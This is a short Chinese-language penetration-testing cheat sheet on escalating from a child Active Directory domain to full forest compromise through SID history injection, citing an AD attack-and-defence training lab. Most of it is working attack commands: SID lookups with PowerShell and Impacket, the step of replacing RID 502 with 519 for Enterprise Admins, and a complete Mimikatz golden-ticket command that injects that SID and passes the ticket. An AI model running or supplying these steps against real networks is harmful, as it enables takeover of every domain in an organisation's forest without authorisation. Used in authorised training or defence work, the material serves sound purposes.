# 子域到林攻陷 (Child Domain to Forest Compromise) - SID 劫持 (SID Hijacking)

大多数树通过双向信任关系链接在一起，以允许共享资源。
默认情况下，创建的第一个域是林根域 (Forest Root)。

**要求 (Requirements)**:

- KRBTGT 哈希
- 找到域的 SID

    ```powershell
    $ Convert-NameToSid target.domain.com\krbtgt
    S-1-5-21-2941561648-383941485-1389968811-502

    # 使用 Impacket
    lookupsid.py domain/user:password@10.10.10.10
    ```

- 将 502 替换为 519，代表企业管理员 (Enterprise Admins)

**利用 (Exploitation)**:

- 创建黄金票据并攻击父域。

    ```powershell
    kerberos::golden /user:Administrator /krbtgt:HASH_KRBTGT /domain:domain.local /sid:S-1-5-21-2941561648-383941485-1389968811 /sids:S-1-5-SID-SECOND-DOMAIN-519 /ptt
    ```

## 参考资料 (References)

- [Training - Attacking and Defending Active Directory Lab - Altered Security](https://www.alteredsecurity.com/adlab)
